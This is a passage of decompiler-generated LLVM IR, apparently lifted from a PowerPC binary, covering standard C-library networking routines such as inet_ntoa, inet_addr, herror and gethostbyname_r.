  store i32 %v2_1000e620, i32* @r30, align 4
  store i32 268494380, i32* @lr, align 4
  %v3_1000e628 = call i32 @ioctl(i32 %v0_1000e618, i32 1076655123, i32 %v2_1000e5b0)
  %v3_1000e62c = icmp eq i32 %v3_1000e628, 0
  br i1 %v3_1000e62c, label %dec_label_pc_1000e63c, label %dec_label_pc_1000e634

dec_label_pc_1000e634:                            ; preds = %dec_label_pc_1000e608
  %v0_1000e634 = load i32, i32* @r30, align 4
  %v1_1000e634 = load i32, i32* @r29, align 4
  %v2_1000e634 = inttoptr i32 %v1_1000e634 to i32*
  store i32 %v0_1000e634, i32* %v2_1000e634, align 4
  br label %dec_label_pc_1000e67c

dec_label_pc_1000e63c:                            ; preds = %dec_label_pc_1000e608
  %v0_1000e63c = load i32, i32* @r31, align 4
  %v1_1000e63c = add i32 %v0_1000e63c, 8
  %v2_1000e63c = inttoptr i32 %v1_1000e63c to i32*
  %v3_1000e63c = load i32, i32* %v2_1000e63c, align 4
  %v1_1000e644 = call i32 @__asm_rlwinm(i32 %v3_1000e63c, i32 0, i32 19, i32 20)
  %v1_1000e648 = call i32 @__asm_rlwinm(i32 %v3_1000e5a4, i32 0, i32 19, i32 20)
  store i32 %v1_1000e648, i32* %r9.global-to-local, align 4
  %v4_1000e64c = icmp eq i32 %v1_1000e644, %v1_1000e648
  br i1 %v4_1000e64c, label %dec_label_pc_1000e654, label %dec_label_pc_1000e668

dec_label_pc_1000e654:                            ; preds = %dec_label_pc_1000e63c
  %v1_1000e654 = and i32 %v3_1000e63c, 768
  store i32 %v1_1000e654, i32* %r9.global-to-local, align 4
  %v3_1000e654 = icmp eq i32 %v1_1000e654, 0
  br i1 %v3_1000e654, label %dec_label_pc_1000e678, label %dec_label_pc_1000e65c

dec_label_pc_1000e65c:                            ; preds = %dec_label_pc_1000e654
  %v1_1000e65c = call i32 @__asm_rlwinm(i32 %v3_1000e5a4, i32 0, i32 22, i32 23)
  %v0_1000e660 = load i32, i32* %r9.global-to-local, align 4
  %v4_1000e660 = icmp eq i32 %v0_1000e660, %v1_1000e65c
  br i1 %v4_1000e660, label %dec_label_pc_1000e678, label %dec_label_pc_1000e668

dec_label_pc_1000e668:                            ; preds = %dec_label_pc_1000e63c, %dec_label_pc_1000e65c
  store i32 -1, i32* @r28, align 4
  %v1_1000e670 = load i32, i32* @r29, align 4
  %v2_1000e670 = inttoptr i32 %v1_1000e670 to i32*
  store i32 22, i32* %v2_1000e670, align 4
  br label %dec_label_pc_1000e67c

dec_label_pc_1000e678:                            ; preds = %dec_label_pc_1000e5fc, %dec_label_pc_1000e65c, %dec_label_pc_1000e654
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000e67c

dec_label_pc_1000e67c:                            ; preds = %dec_label_pc_1000e594, %dec_label_pc_1000e634, %dec_label_pc_1000e578, %dec_label_pc_1000e668, %dec_label_pc_1000e678
  %v0_1000e680 = load i32, i32* @r28, align 4
  ret i32 %v0_1000e680

; uselistorder directives
  uselistorder i32 %v0_1000e548, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0, 3 }
  uselistorder i32 19, { 5, 6, 7, 0, 8, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_1000e67c, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e678, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000e668, { 1, 0 }
  uselistorder label %dec_label_pc_1000e594, { 2, 1, 0 }
}

define i32 @ntohl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000e694 = load i32, i32* @r3, align 4
  ret i32 %v0_1000e694
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_1000e698 = load i32, i32* @r3, align 4
  ret i32 %v0_1000e698
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000e69c = load i32, i32* @r3, align 4
  ret i32 %v0_1000e69c
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000e6a0 = load i32, i32* @r3, align 4
  ret i32 %v0_1000e6a0
}

define i32 @hstrerror(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1000e6a4 = icmp ugt i32 %arg1, 4
  br i1 %v2_1000e6a4, label %dec_label_pc_1000e6c4, label %dec_label_pc_1000e6b8

dec_label_pc_1000e6b8:                            ; preds = %entry
  %v1_1000e6b0 = mul i32 %arg1, 4
  %v2_1000e6c0 = add i32 %v1_1000e6b0, ptrtoint ([5 x i8*]* @global_var_1001a0cc.744 to i32)
  %v3_1000e6c0 = inttoptr i32 %v2_1000e6c0 to i32*
  %v4_1000e6c0 = load i32, i32* %v3_1000e6c0, align 4
  br label %dec_label_pc_1000e6c4

dec_label_pc_1000e6c4:                            ; preds = %entry, %dec_label_pc_1000e6b8
  %v0_1000e6c4 = phi i32 [ ptrtoint ([15 x i8]* @global_var_1001a0e0.738 to i32), %entry ], [ %v4_1000e6c0, %dec_label_pc_1000e6b8 ]
  ret i32 %v0_1000e6c4

; uselistorder directives
  uselistorder label %dec_label_pc_1000e6c4, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000e6d0 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v4_1000e6dc = icmp eq i8* %arg1, null
  store i32 ptrtoint (i32* @global_var_1001a0f2.745 to i32), i32* %r30.global-to-local, align 4
  br i1 %v4_1000e6dc, label %dec_label_pc_1000e700, label %dec_label_pc_1000e6ec

dec_label_pc_1000e6ec:                            ; preds = %entry
  %v2_1000e6ec = load i8, i8* %arg1, align 1
  %v3_1000e6f0 = icmp eq i8 %v2_1000e6ec, 0
  br i1 %v3_1000e6f0, label %dec_label_pc_1000e700, label %dec_label_pc_1000e6f8

dec_label_pc_1000e6f8:                            ; preds = %dec_label_pc_1000e6ec
  store i32 ptrtoint ([3 x i8]* @global_var_1001a0f0.746 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e700

dec_label_pc_1000e700:                            ; preds = %dec_label_pc_1000e6ec, %entry, %dec_label_pc_1000e6f8
  %v0_1000e700 = call i32 @__GI___h_errno_location()
  %v1_1000e708 = inttoptr i32 %v0_1000e700 to i32*
  %v2_1000e708 = load i32, i32* %v1_1000e708, align 4
  %v2_1000e710 = icmp ugt i32 %v2_1000e708, 4
  br i1 %v2_1000e710, label %dec_label_pc_1000e728, label %dec_label_pc_1000e71c

dec_label_pc_1000e71c:                            ; preds = %dec_label_pc_1000e700
  br label %dec_label_pc_1000e728

dec_label_pc_1000e728:                            ; preds = %dec_label_pc_1000e700, %dec_label_pc_1000e71c
  %v3_1000e734 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -18220) to i32*), align 4
  store i32 %v3_1000e734, i32* @r3, align 4
  store i32 %v0_1000e6d0, i32* @lr, align 4
  %v0_1000e73c = load i32, i32* %r31.global-to-local, align 4
  %v0_1000e740 = load i32, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1001a058.747 to i32), i32* @r4, align 4
  %v7_1000e754 = call i32 @fprintf(i32 %v3_1000e734, i32 ptrtoint ([8 x i8]* @global_var_1001a058.747 to i32), i32 %v0_1000e73c, i32 %v0_1000e740, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  ret i32 %v7_1000e754

; uselistorder directives
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e728, { 1, 0 }
  uselistorder label %dec_label_pc_1000e700, { 2, 0, 1 }
}

define i32 @__GI_inet_ntoa_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_1000e760 = add i32 %arg2, 15
  store i32 %v1_1000e760, i32* %r4.global-to-local, align 4
  %v2_1000e774 = load i32, i32* %arg1, align 4
  store i32 %v2_1000e774, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e77c

dec_label_pc_1000e77c:                            ; preds = %dec_label_pc_1000e7a0.dec_label_pc_1000e77c_crit_edge, %entry
  %v0_1000e77c = phi i32 [ %v2_1000e774, %entry ], [ %v0_1000e77c.pre, %dec_label_pc_1000e7a0.dec_label_pc_1000e77c_crit_edge ]
  %v0_1000e7c08 = phi i32 [ %v1_1000e760, %entry ], [ %v0_1000e7a0, %dec_label_pc_1000e7a0.dec_label_pc_1000e77c_crit_edge ]
  %v1_1000e77c = urem i32 %v0_1000e77c, 256
  %v5_1000e784 = inttoptr i32 %v0_1000e7c08 to i8*
  %v6_1000e784 = call i32 @_uintmaxtostr(i8* %v5_1000e784, i32 0, i32 %v1_1000e77c, i32 -10, i32 0)
  %v0_1000e788 = load i32, i32* @r30, align 4
  %v3_1000e788 = icmp eq i32 %v0_1000e788, 0
  %v0_1000e78c = load i32, i32* @r31, align 4
  %v1_1000e78c = udiv i32 %v0_1000e78c, 256
  store i32 %v1_1000e78c, i32* %r31.global-to-local, align 4
  %v1_1000e790 = add i32 %v6_1000e784, -1
  store i32 %v1_1000e790, i32* %r4.global-to-local, align 4
  br i1 %v3_1000e788, label %dec_label_pc_1000e7a0, label %dec_label_pc_1000e798

dec_label_pc_1000e798:                            ; preds = %dec_label_pc_1000e77c
  %v3_1000e79c = inttoptr i32 %v0_1000e788 to i8*
  store i8 46, i8* %v3_1000e79c, align 1
  %v0_1000e7a0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000e7a0

dec_label_pc_1000e7a0:                            ; preds = %dec_label_pc_1000e77c, %dec_label_pc_1000e798
  %v0_1000e7a0 = phi i32 [ %v1_1000e790, %dec_label_pc_1000e77c ], [ %v0_1000e7a0.pre, %dec_label_pc_1000e798 ]
  %v0_1000e7a4.pre = load i32, i32* @r29, align 4
  %v1_1000e7b4 = add i32 %v0_1000e7a4.pre, 1
  store i32 %v1_1000e7b4, i32* @r29, align 4
  %tmp7 = icmp slt i32 %v0_1000e7a4.pre, 4
  br i1 %tmp7, label %dec_label_pc_1000e7a0.dec_label_pc_1000e77c_crit_edge, label %dec_label_pc_1000e7bc

dec_label_pc_1000e7a0.dec_label_pc_1000e77c_crit_edge: ; preds = %dec_label_pc_1000e7a0
  %v0_1000e77c.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e77c

dec_label_pc_1000e7bc:                            ; preds = %dec_label_pc_1000e7a0
  %v1_1000e7c0 = add i32 %v0_1000e7a0, 1
  ret i32 %v1_1000e7c0

; uselistorder directives
  uselistorder i32 %v0_1000e7a4.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e7a0, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_1000e7e8 = load i32, i32* %arg1, align 4
  store i32 %v2_1000e7e8, i32* %stack_var_-8, align 4
  store i32 268494840, i32* @lr, align 4
  %v3_1000e7f4 = call i32 @__GI_inet_ntoa_r(i32* nonnull %stack_var_-8, i32 ptrtoint (i32* @global_var_10031998.748 to i32))
  ret i32 %v3_1000e7f4
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000e810 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000e810, i32* @r4, align 4
  store i32 268494876, i32* @lr, align 4
  %v1_1000e818 = bitcast i32* %stack_var_-24 to i8*
  %v2_1000e818 = call i32 @inet_aton(i8* %v1_1000e818)
  %v3_1000e81c = icmp eq i32 %v2_1000e818, 0
  br i1 %v3_1000e81c, label %dec_label_pc_1000e82c, label %dec_label_pc_1000e828

dec_label_pc_1000e828:                            ; preds = %entry
  %v3_1000e828 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000e82c

dec_label_pc_1000e82c:                            ; preds = %entry, %dec_label_pc_1000e828
  %v0_1000e838 = phi i32 [ -1, %entry ], [ %v3_1000e828, %dec_label_pc_1000e828 ]
  ret i32 %v0_1000e838

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e82c, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000e850 = call i32 @__GI___h_errno_location()
  %v2_1000e860 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268494968, i32* @lr, align 4
  %v7_1000e874 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_10031b74.749, i32 ptrtoint (i32* @global_var_100319a8.750 to i32), i32 460, i32 %v2_1000e860, i32 %v0_1000e850)
  %v3_1000e87c = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_1000e87c
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_1000e894 = load i32, i32* @lr, align 4
  store i32 %v0_1000e894, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_1000e89c = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_1000e8bc = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1000e8bc, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_1000e89c, label %dec_label_pc_1000ebc0, label %dec_label_pc_1000e8c8

dec_label_pc_1000e8c8:                            ; preds = %entry
  %v0_1000e8c8 = call i32 @__errno_location()
  store i32 %v0_1000e8c8, i32* %r3.global-to-local, align 4
  %v1_1000e8d0 = inttoptr i32 %v0_1000e8c8 to i32*
  %v2_1000e8d0 = load i32, i32* %v1_1000e8d0, align 4
  store i32 %v2_1000e8d0, i32* @r27, align 4
  store i32 %v0_1000e8c8, i32* %r28.global-to-local, align 4
  %v0_1000e8d8 = load i32, i32* @r31, align 4
  store i32 %v0_1000e8d8, i32* %v1_1000e8d0, align 4
  %v0_1000e8dc = load i32, i32* %r26.global-to-local, align 4
  %v0_1000e8e0 = load i32, i32* @r23, align 4
  store i32 %v0_1000e8e0, i32* %r3.global-to-local, align 4
  %v0_1000e8e4 = load i32, i32* %r30.global-to-local, align 4
  %v0_1000e8e8 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000e8ec = load i32, i32* %r20.global-to-local, align 4
  %v0_1000e8f0 = load i32, i32* @r24, align 4
  store i32 268495096, i32* @lr, align 4
  %v7_1000e8f4 = call i32 @__get_hosts_byname_r(i32 %v0_1000e8e0, i32 2, i32 %v0_1000e8dc, i32 %v0_1000e8e4, i32 %v0_1000e8e8, i32 %v0_1000e8ec, i32 %v0_1000e8f0)
  store i32 %v7_1000e8f4, i32* %r3.global-to-local, align 4
  %v3_1000e8f8 = icmp eq i32 %v7_1000e8f4, 0
  br i1 %v3_1000e8f8, label %dec_label_pc_1000ebc0, label %dec_label_pc_1000e900

dec_label_pc_1000e900:                            ; preds = %dec_label_pc_1000e8c8
  %v0_1000e900 = load i32, i32* @r24, align 4
  %v1_1000e900 = inttoptr i32 %v0_1000e900 to i32*
  %v2_1000e900 = load i32, i32* %v1_1000e900, align 4
  store i32 %v2_1000e900, i32* %r0.global-to-local, align 4
  %v3_1000e904 = icmp eq i32 %v2_1000e900, 1
  br i1 %v3_1000e904, label %dec_label_pc_1000e928, label %dec_label_pc_1000e90c

dec_label_pc_1000e90c:                            ; preds = %dec_label_pc_1000e900
  %v3_1000e90c = icmp eq i32 %v2_1000e900, 4
  br i1 %v3_1000e90c, label %dec_label_pc_1000e928, label %dec_label_pc_1000e914

dec_label_pc_1000e914:                            ; preds = %dec_label_pc_1000e90c
  %v3_1000e914 = icmp eq i32 %v2_1000e900, -1
  br i1 %v3_1000e914, label %dec_label_pc_1000e91c, label %dec_label_pc_1000ebc0

dec_label_pc_1000e91c:                            ; preds = %dec_label_pc_1000e914
  %v0_1000e91c = load i32, i32* @r28, align 4
  %v1_1000e91c = inttoptr i32 %v0_1000e91c to i32*
  %v2_1000e91c = load i32, i32* %v1_1000e91c, align 4
  store i32 %v2_1000e91c, i32* %r0.global-to-local, align 4
  %v3_1000e920 = icmp eq i32 %v2_1000e91c, 2
  br i1 %v3_1000e920, label %dec_label_pc_1000e928, label %dec_label_pc_1000ebc0

dec_label_pc_1000e928:                            ; preds = %dec_label_pc_1000e91c, %dec_label_pc_1000e90c, %dec_label_pc_1000e900
  %v0_1000e928 = load i32, i32* @r30, align 4
  %v1_1000e928 = sub i32 0, %v0_1000e928
  store i32 %v1_1000e928, i32* %r0.global-to-local, align 4
  %v0_1000e92c = load i32, i32* @r27, align 4
  %v1_1000e92c = load i32, i32* @r28, align 4
  %v2_1000e92c = inttoptr i32 %v1_1000e92c to i32*
  store i32 %v0_1000e92c, i32* %v2_1000e92c, align 4
  %v0_1000e930 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e930 = urem i32 %v0_1000e930, 4
  store i32 %v1_1000e930, i32* %r0.global-to-local, align 4
  %v3_1000e930 = icmp eq i32 %v1_1000e930, 0
  %v0_1000e948.pre = load i32, i32* @r29, align 4
  br i1 %v3_1000e930, label %dec_label_pc_1000e948, label %dec_label_pc_1000e938

dec_label_pc_1000e938:                            ; preds = %dec_label_pc_1000e928
  %v2_1000e938 = icmp ult i32 %v0_1000e948.pre, %v1_1000e930
  br i1 %v2_1000e938, label %dec_label_pc_1000ebbc, label %dec_label_pc_1000e940

dec_label_pc_1000e940:                            ; preds = %dec_label_pc_1000e938
  %v2_1000e940 = sub i32 %v0_1000e948.pre, %v1_1000e930
  store i32 %v2_1000e940, i32* @r29, align 4
  %v0_1000e944 = load i32, i32* @r30, align 4
  %v2_1000e944 = add i32 %v0_1000e944, %v1_1000e930
  store i32 %v2_1000e944, i32* @r30, align 4
  br label %dec_label_pc_1000e948

dec_label_pc_1000e948:                            ; preds = %dec_label_pc_1000e928, %dec_label_pc_1000e940
  %v0_1000e948 = phi i32 [ %v2_1000e940, %dec_label_pc_1000e940 ], [ %v0_1000e948.pre, %dec_label_pc_1000e928 ]
  %v1_1000e950 = load i32, i32* @r24, align 4
  %v2_1000e950 = inttoptr i32 %v1_1000e950 to i32*
  store i32 -1, i32* %v2_1000e950, align 4
  %tmp29 = icmp ult i32 %v0_1000e948, 4
  br i1 %tmp29, label %dec_label_pc_1000ebbc, label %dec_label_pc_1000e958

dec_label_pc_1000e958:                            ; preds = %dec_label_pc_1000e948
  %v0_1000e958 = load i32, i32* @r29, align 4
  %v1_1000e958 = add i32 %v0_1000e958, -4
  store i32 %v1_1000e958, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_1000e958, 8
  br i1 %tmp30, label %dec_label_pc_1000ebbc, label %dec_label_pc_1000e964

dec_label_pc_1000e964:                            ; preds = %dec_label_pc_1000e958
  %v1_1000e964 = add i32 %v0_1000e958, -12
  store i32 %v1_1000e964, i32* %r0.global-to-local, align 4
  %v0_1000e968 = load i32, i32* @r30, align 4
  %v1_1000e968 = add i32 %v0_1000e968, 4
  store i32 %v1_1000e968, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_1000e974 = inttoptr i32 %v1_1000e968 to i32*
  store i32 %v0_1000e968, i32* %v3_1000e974, align 4
  %v0_1000e978 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000e978 = load i32, i32* %r25.global-to-local, align 4
  %v2_1000e978 = add i32 %v1_1000e978, 4
  %v3_1000e978 = inttoptr i32 %v2_1000e978 to i32*
  store i32 %v0_1000e978, i32* %v3_1000e978, align 4
  %tmp31 = icmp ult i32 %v1_1000e964, 32
  br i1 %tmp31, label %dec_label_pc_1000ebbc, label %dec_label_pc_1000e980

dec_label_pc_1000e980:                            ; preds = %dec_label_pc_1000e964
  %v0_1000e980 = load i32, i32* @r29, align 4
  %v1_1000e980 = add i32 %v0_1000e980, -44
  %tmp32 = icmp ult i32 %v1_1000e980, 256
  br i1 %tmp32, label %dec_label_pc_1000ebbc, label %dec_label_pc_1000e98c

dec_label_pc_1000e98c:                            ; preds = %dec_label_pc_1000e980
  %v0_1000e98c = load i32, i32* @r30, align 4
  %v1_1000e98c = add i32 %v0_1000e98c, 44
  store i32 %v1_1000e98c, i32* @r31, align 4
  %v0_1000e990 = load i32, i32* @r23, align 4
  store i32 %v0_1000e990, i32* @r4, align 4
  %v1_1000e998 = add i32 %v0_1000e98c, 12
  store i32 %v1_1000e998, i32* %r21.global-to-local, align 4
  store i32 %v1_1000e98c, i32* %r3.global-to-local, align 4
  store i32 268495268, i32* @lr, align 4
  %v3_1000e9a0 = call i32 @strncpy(i32 %v1_1000e98c, i32 %v0_1000e990, i32 %v1_1000e980)
  %v0_1000e9a4 = load i32, i32* @r31, align 4
  %v1_1000e9a4 = load i32, i32* @r30, align 4
  %v2_1000e9a4 = add i32 %v1_1000e9a4, 12
  %v3_1000e9a4 = inttoptr i32 %v2_1000e9a4 to i32*
  store i32 %v0_1000e9a4, i32* %v3_1000e9a4, align 4
  %v0_1000e9a8 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000e9a8 = load i32, i32* %r21.global-to-local, align 4
  %v2_1000e9a8 = add i32 %v1_1000e9a8, 4
  %v3_1000e9a8 = inttoptr i32 %v2_1000e9a8 to i32*
  store i32 %v0_1000e9a8, i32* %v3_1000e9a8, align 4
  %v0_1000e9ac = load i32, i32* @r23, align 4
  store i32 %v0_1000e9ac, i32* %r3.global-to-local, align 4
  %v0_1000e9b0 = load i32, i32* @r30, align 4
  store i32 %v0_1000e9b0, i32* @r4, align 4
  store i32 268495288, i32* @lr, align 4
  %v2_1000e9b4 = inttoptr i32 %v0_1000e9ac to i8*
  %v3_1000e9b4 = call i32 @inet_aton(i8* %v2_1000e9b4)
  store i32 %v3_1000e9b4, i32* %r3.global-to-local, align 4
  store i32 %v3_1000e9b4, i32* %r22.global-to-local, align 4
  %v3_1000e9b8 = icmp eq i32 %v3_1000e9b4, 0
  br i1 %v3_1000e9b8, label %dec_label_pc_1000e9ec, label %dec_label_pc_1000e9c0

dec_label_pc_1000e9c0:                            ; preds = %dec_label_pc_1000e98c
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000e9c8 = load i32, i32* @r26, align 4
  %v2_1000e9c8 = add i32 %v1_1000e9c8, 8
  %v3_1000e9c8 = inttoptr i32 %v2_1000e9c8 to i32*
  store i32 2, i32* %v3_1000e9c8, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000e9d0 = load i32, i32* @r31, align 4
  %v1_1000e9d0 = load i32, i32* @r26, align 4
  %v2_1000e9d0 = inttoptr i32 %v1_1000e9d0 to i32*
  store i32 %v0_1000e9d0, i32* %v2_1000e9d0, align 4
  %v0_1000e9d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000e9d4 = load i32, i32* @r26, align 4
  %v2_1000e9d4 = add i32 %v1_1000e9d4, 12
  %v3_1000e9d4 = inttoptr i32 %v2_1000e9d4 to i32*
  store i32 %v0_1000e9d4, i32* %v3_1000e9d4, align 4
  %v0_1000e9d8 = load i32, i32* %r25.global-to-local, align 4
  %v1_1000e9d8 = load i32, i32* @r26, align 4
  %v2_1000e9d8 = add i32 %v1_1000e9d8, 16
  %v3_1000e9d8 = inttoptr i32 %v2_1000e9d8 to i32*
  store i32 %v0_1000e9d8, i32* %v3_1000e9d8, align 4
  %v0_1000e9dc = load i32, i32* %r21.global-to-local, align 4
  %v1_1000e9dc = load i32, i32* @r26, align 4
  %v2_1000e9dc = add i32 %v1_1000e9dc, 4
  %v3_1000e9dc = inttoptr i32 %v2_1000e9dc to i32*
  store i32 %v0_1000e9dc, i32* %v3_1000e9dc, align 4
  %v0_1000e9e0 = load i32, i32* @r26, align 4
  %v1_1000e9e0 = load i32, i32* @r20, align 4
  %v2_1000e9e0 = inttoptr i32 %v1_1000e9e0 to i32*
  store i32 %v0_1000e9e0, i32* %v2_1000e9e0, align 4
  %v0_1000e9e4 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000e9e4 = load i32, i32* @r24, align 4
  %v2_1000e9e4 = inttoptr i32 %v1_1000e9e4 to i32*
  store i32 %v0_1000e9e4, i32* %v2_1000e9e4, align 4
  br label %dec_label_pc_1000ebc0

dec_label_pc_1000e9ec:                            ; preds = %dec_label_pc_1000e98c
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 268495348, i32* @lr, align 4
  %v0_1000e9f0 = call i32 @__open_nameservers()
  store i32 ptrtoint (i32* @global_var_1002b870.751 to i32), i32* %r29.global-to-local, align 4
  %v2_1000e9f8 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_1000e9f8, i32* %r28.global-to-local, align 4
  store i32 %v2_1000e9f8, i32* @r3, align 4
  %v0_1000ea0c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1002b870.751 to i32), i32* %r3.global-to-local, align 4
  %v0_1000ea14 = call i32 @__pthread_return_0()
  %v3_1000ea1c = load i32, i32* @global_var_1002b964.753, align 4
  store i32 %v3_1000ea1c, i32* %r29.global-to-local, align 4
  store i32 %v2_1000e9f8, i32* @r3, align 4
  %v0_1000ea28 = call i32 @__pthread_return_void()
  %v0_1000ea30 = load i32, i32* @r23, align 4
  store i32 %v0_1000ea30, i32* %r3.global-to-local, align 4
  %v2_1000ea40 = ptrtoint i32* %stack_var_-120 to i32
  %v2_1000ea44 = ptrtoint i32* %stack_var_-100 to i32
  %v0_1000ea48 = load i32, i32* %r22.global-to-local, align 4
  store i32 268495448, i32* @lr, align 4
  %v6_1000ea54 = inttoptr i32 %v0_1000ea30 to i8*
  %v7_1000ea54 = call i32 @__dns_lookup(i8* %v6_1000ea54, i32 1, i32 %v3_1000ea1c, i32 ptrtoint (i32* @global_var_10031c60.754 to i32), i32 %v2_1000ea40, i32 %v2_1000ea44)
  store i32 %v7_1000ea54, i32* %r3.global-to-local, align 4
  %v1_1000ea58 = icmp slt i32 %v7_1000ea54, 0
  br i1 %v1_1000ea58, label %dec_label_pc_1000eba0, label %dec_label_pc_1000ea60

dec_label_pc_1000ea60:                            ; preds = %dec_label_pc_1000e9ec
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_1000ea68 = add i32 %tmp19, 4
  %v2_1000ea6c = mul i32 %v0_1000ea48, %v1_1000ea68
  %v1_1000ea70 = add i32 %v2_1000ea6c, 256
  %v1_1000ea74 = load i32, i32* @r27, align 4
  %v3_1000ea74 = icmp ugt i32 %v1_1000ea70, %v1_1000ea74
  br i1 %v3_1000ea74, label %dec_label_pc_1000ea7c, label %dec_label_pc_1000ea98

dec_label_pc_1000ea7c:                            ; preds = %dec_label_pc_1000ea60
  %v3_1000ea7c = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000ea7c, i32* %r3.global-to-local, align 4
  store i32 268495492, i32* @lr, align 4
  %v1_1000ea80 = call i32 @free(i32 %v3_1000ea7c)
  %v3_1000ea84 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000ea84, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ea8c.755 to i32), i32* @lr, align 4
  %v1_1000ea88 = call i32 @free(i32 %v3_1000ea84)
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_1000ea90 = load i32, i32* @r19, align 4
  %v1_1000ea90 = load i32, i32* @r24, align 4
  %v2_1000ea90 = inttoptr i32 %v1_1000ea90 to i32*
  store i32 %v0_1000ea90, i32* %v2_1000ea90, align 4
  br label %dec_label_pc_1000ebc0

dec_label_pc_1000ea98:                            ; preds = %dec_label_pc_1000ea60
  %v3_1000ea98 = icmp eq i32 %v0_1000ea48, 0
  br i1 %v3_1000ea98, label %dec_label_pc_1000ea98.dec_label_pc_1000eb3c_crit_edge, label %dec_label_pc_1000eaa0

dec_label_pc_1000ea98.dec_label_pc_1000eb3c_crit_edge: ; preds = %dec_label_pc_1000ea98
  %v0_1000eb44.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000eb3c

